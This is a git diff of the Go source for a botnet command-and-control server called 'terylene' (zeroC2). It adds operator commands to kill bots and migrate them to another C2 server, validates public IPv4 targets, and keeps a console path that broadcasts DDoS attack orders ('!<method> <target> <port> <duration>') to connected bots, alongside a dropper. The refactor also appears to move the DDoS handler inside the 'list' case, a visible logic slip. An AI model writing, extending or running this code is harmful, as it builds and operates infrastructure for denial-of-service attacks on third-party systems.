@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -12,6 +13,7 @@ import (
 	"sync"
 	config "terylene/config"
 	dropper "terylene/server/components/dropper"
+	"terylene/server/components/setup"
 	"terylene/server/components/transfer"
 	poly "terylene/server/theme/default"
 	"time"
@@ -89,6 +91,19 @@ func clearScreen() {
 	cmd.Run()
 }
 
+func isPublicIPv4(address string) bool {
+	ip := net.ParseIP(address)
+	if ip == nil || ip.To4() == nil {
+		return false
+	}
+
+	return !ip.IsLoopback() && !ip.IsLinkLocalMulticast() && !ip.IsLinkLocalUnicast() && !ip.IsMulticast() && !ip.IsUnspecified() && !ip.IsPrivate()
+}
+
+func isValidport(port int) bool {
+	return port >= 0 && port <= 65535
+}
+
 func routerhandle(router *zmq.Socket) {
 	for {
 		msg, err := router.RecvMessage(0)
@@ -145,54 +160,125 @@ func routerhandle(router *zmq.Socket) {
 	}
 }
 
-func transferprompt(router, publisher *zmq.Socket, scanner *bufio.Scanner) {
-	if len(aliveclient) == 0 {
-		fmt.Println("you dont have any online bots sadly :(")
-		return
+func randomtransfer(target string, rport, amount int, router, publisher *zmq.Socket) {
+	count := 0
+	for id := range aliveclient {
+		routmutex.Lock()
+		router.SendMessage(id, "migrate", target, rport)
+		routmutex.Unlock()
+		broadcaster("migrate", connIDs[id], publisher)
+		delete(aliveclient, id)
+		delete(tera, id)
+		delete(connIDs, id)
+		if count == amount {
+			break
+		}
 	}
-	fmt.Printf("target server:")
-	scanner.Scan()
-	target := strings.TrimSpace(scanner.Text())
 
-	fmt.Printf("router port:")
-	scanner.Scan()
-	rport := strings.TrimSpace(scanner.Text())
+}
 
-	fmt.Printf("amount of terylene to transfer:")
-	scanner.Scan()
-	amount := strings.TrimSpace(scanner.Text())
+func killprompt(prompt string, router, publisher *zmq.Socket) string {
+	parts := strings.Fields(prompt)
 
-	intamount, err := strconv.Atoi(amount)
-
-	if intamount > len(aliveclient) {
-		fmt.Printf("sorry, you only have %d bots", len(aliveclient))
+	if len(parts) != 2 {
+		return poly.Killhelp
 	}
-	if err != nil {
-		fmt.Println("botnet input is invalid")
-		return
-	}
-	err = transfer.Transfercheck(target, rport)
-	if err != nil {
-		fmt.Println("Server check failed, stopped transfer")
+
+	if parts[1] == "all" {
+		killall(publisher)
 	} else {
-		fmt.Printf("server check passed, initiating transfer of %d botnets\n", intamount)
-		count := 0
-		for id := range aliveclient {
+		return (kill(parts[1], router))
+	}
+
+	return ""
+}
+
+func killall(publisher *zmq.Socket) {
+	broadcaster("killall", "terylene", publisher)
+	clearScreen()
+	fmt.Println(poly.Killallsuc)
+}
+
+func kill(connId string, router *zmq.Socket) string {
+	for zid, id := range connIDs {
+		if id == connId {
 			routmutex.Lock()
-			router.SendMessage(id, "migrate", target, rport)
-			broadcaster("migrate", connIDs[id], publisher)
+			router.SendMessage(zid, "kill")
 			routmutex.Unlock()
-			delete(aliveclient, id)
-			delete(tera, id)
-			delete(connIDs, id)
-			if count == intamount {
-				break
+			return fmt.Sprintf(poly.Killone, connId)
+		}
+	}
+
+	return poly.NoConnId
+}
+
+func transferprompt(prompt string, router, publisher *zmq.Socket) string {
+	parts := strings.Fields(prompt)
+
+	if len(parts) != 5 {
+		return poly.Transferhelp
+	}
+
+	if len(aliveclient) == 0 {
+		return poly.Nobots
+	}
+
+	target := parts[1]
+	port := parts[2]
+
+	if !isPublicIPv4(target) {
+		return poly.InvalidIp
+	}
+
+	rport, err := strconv.Atoi(port)
+
+	if err != nil {
+		return poly.Invalidport
+	}
+
+	if !isValidport(rport) {
+		return poly.Invalidport
+	}
+
+	err = transfer.Transfercheck(target, port)
+
+	if err != nil {
+		return poly.NoMitigation
+	}
+
+	if parts[3] == "random" {
+		number, err := strconv.Atoi(parts[4])
+
+		if err != nil {
+			return poly.InvalidNumber
+		}
+
+		randomtransfer(target, rport, number, router, publisher)
+		return poly.MitSuccess
+	}
+
+	if parts[3] == "specific" {
+		for zid, id := range connIDs {
+			if id == parts[4] {
+				routmutex.Lock()
+				router.SendMessage(zid, "migrate", target, rport)
+				routmutex.Unlock()
+				broadcaster("migrate", id, publisher)
+				delete(aliveclient, zid)
+				delete(tera, zid)
+				delete(connIDs, zid)
+				return poly.MitSuccess
+			} else {
+				continue
 			}
 		}
-		fmt.Println("operation successful!!!")
 
+		return poly.NoConnId
 	}
+
+	return ""
 }
+
 func getpubIp() string {
 	url := "https://api.ipify.org?format=text"
 	resp, err := http.Get(url)
@@ -210,65 +296,14 @@ func getpubIp() string {
 func main() {
 	scanner := bufio.NewScanner(os.Stdin)
 
-	title := poly.Title
-	help := poly.Help
-	methods_list := poly.Methods
-	cmdtext := poly.Cmd
-	Ddosmsg := poly.Ddosmsg
-	terminalcolor := color.New(color.FgCyan).Add(color.BgHiBlack)
+	terminalcolor, router, publisher := setup.Setup()
 
-	clearScreen()
-
-	color.Cyan(title)
-
-	time.Sleep(50 * time.Millisecond)
-
-	color.Cyan("[...]starting zeroC2 broadcast server")
-
-	publisher, err := zmq.NewSocket(zmq.PUB)
-
-	defer publisher.Close()
-
-	if err != nil {
-		fmt.Println(err)
-		color.Red("[X]error starting zeroC2 broadcast")
-		os.Exit(1)
-	}
-
-	err = publisher.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Broadcastport))
-
-	if err != nil {
-		fmt.Println(err)
-		color.Red("[X] error binding port %s", config.Broadcastport)
-		os.Exit(1)
-	}
-
-	time.Sleep(50 * time.Millisecond)
-	color.Green("[✔] successfully started zeroC2 broadcast")
-	time.Sleep(50 * time.Millisecond)
-	color.Cyan("[...]starting zeroC2 router server")
-
-	router, err := zmq.NewSocket(zmq.ROUTER)
-
-	if err != nil {
-		color.Red("[X] error creating router socket")
-	}
 	defer router.Close()
-
-	err = router.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Routerport))
-
-	router.SetLinger(0)
-	if err != nil {
-		fmt.Println(err)
-		color.Red("[X] error binding port %s", config.Routerport)
-		os.Exit(1)
-	}
+	defer publisher.Close()
 
 	go heartroutsend(router)
 	go heartpubsend(publisher)
 	go heartbeatcheck()
-
-	color.Green("[✔] successfully started zeroC2 router")
 
 	color.Cyan("[...]starting zeroC2 dropper")
 	go dropper.Dropstart()
@@ -282,7 +317,7 @@ func main() {
 	go routerhandle(router)
 
 	for {
-		terminalcolor.Printf(cmdtext)
+		terminalcolor.Printf(poly.Cmd)
 		scanner.Scan()
 
 		command := scanner.Text()
@@ -291,13 +326,20 @@ func main() {
 			fmt.Println("an error has occured", scanner.Err())
 			break
 		}
+
+		if strings.Contains(command, "transfer") {
+			fmt.Println(transferprompt(command, router, publisher))
+			continue
+		}
+
+		if strings.Contains(command, "kill") {
+			fmt.Println(killprompt(command, router, publisher))
+		}
 		switch command {
 		case "help":
-			fmt.Println(help)
-			continue
+			fmt.Println(poly.Help)
 		case "clear":
 			clearScreen()
-			continue
 		case "exit":
 			publisher.Close()
 			color.Red("[✔] successfully shutdown broadcast")
@@ -305,7 +347,7 @@ func main() {
 			color.Red("[✔] successfully shutdown router")
 			os.Exit(1)
 		case "methods":
-			fmt.Println(methods_list)
+			fmt.Println(poly.Methods)
 		case "list":
 			fmt.Println("Number of bots:", len(aliveclient))
 			if len(aliveclient) != 0 {
@@ -321,45 +363,42 @@ func main() {
 				continue
 			}
 			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
-		case "transfer":
-			transferprompt(router, publisher, scanner)
-		case "killall":
-			broadcaster(command, "terylene", publisher)
-			clearScreen()
-			fmt.Println("All terylene connection killed")
-		}
-		if strings.Contains(command, "!") {
-			containsBlocked := false
-			for _, value := range config.Methods {
-				if strings.Contains(command, value) {
-					for _, block := range config.Blocked {
-						if strings.Contains(command, block) {
-							containsBlocked = true
+			if strings.Contains(command, "!") {
+				containsBlocked := false
+				for _, value := range config.Methods {
+					if strings.Contains(command, value) {
+						for _, block := range config.Blocked {
+							if strings.Contains(command, block) {
+								containsBlocked = true
+							}
 						}
-					}
-					if containsBlocked {
+						if containsBlocked {
+							break
+						}
+						parts := strings.Fields(command)
+						if len(parts) == 4 {
+							if !isPublicIPv4(parts[1]) {
+								continue
+							}
+							_, err := strconv.Atoi(parts[2])
+							if err != nil {
+								continue
+							}
+							_, err = strconv.Atoi(parts[3])
+							if err != nil {
+								continue
+							}
+							broadcaster(command, "terylene", publisher)
+							clearScreen()
+							fmt.Println(poly.Ddosmsg)
+						} else {
+							fmt.Println("format: !<method> <target> <port> <duration>")
+						}
 						break
 					}
-					parts := strings.Fields(command)
-					if len(parts) == 4 {
-						_, err := strconv.Atoi(parts[2])
-						if err != nil {
-							continue
-						}
-						_, err = strconv.Atoi(parts[3])
-						if err != nil {
-							continue
-						}
-						broadcaster(command, "terylene", publisher)
-						clearScreen()
-						fmt.Println(Ddosmsg)
-					} else {
-						fmt.Println("format: !<method> <target> <port> <duration>")
-					}
-					break
 				}
 			}
-		}
 
+		}
 	}
 }
